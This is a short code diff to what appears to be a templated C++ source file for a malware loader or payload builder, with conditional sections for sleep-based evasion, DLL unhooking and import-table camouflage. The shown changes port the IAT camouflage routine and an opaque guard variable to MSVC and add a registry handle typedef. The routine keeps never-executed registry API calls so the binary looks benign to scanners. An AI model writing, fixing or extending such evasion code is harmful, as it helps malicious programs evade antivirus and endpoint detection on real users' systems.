@@ -7,6 +7,11 @@
 #include "obfuscate.hpp.in"
 #include "syscalls.hpp.in"
 
+#ifndef _REGHANDLE_DEFINED
+#define _REGHANDLE_DEFINED
+typedef ULONGLONG REGHANDLE;
+#endif
+
 // ==================== SLEEP ====================
 {{#IF SLEEP}}
 static void evasion_sleep(uint32_t seconds) {
@@ -596,13 +601,17 @@ static void unhook_dll(const wchar_t* dll_name) {
 
 // ==================== IAT CAMOUFLAGE ====================
 {{#IF IAT_CAMOUFLAGE}}
-static void __attribute__((noinline)) iat_camouflage() {
+#ifdef _MSC_VER
+__declspec(noinline)
+#else
+__attribute__((noinline))
+#endif
+static void iat_camouflage() {
     ULONG_PTR uAddr = reinterpret_cast<ULONG_PTR>(
         HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x100));
     if (!uAddr) return;
 
-    int gate = 0;
-    asm volatile("" : "+r"(gate));
+    volatile int gate = 0;
     if (gate) {
         RegCloseKey(NULL);
         RegDeleteKeyExA(NULL, NULL, NULL, NULL);
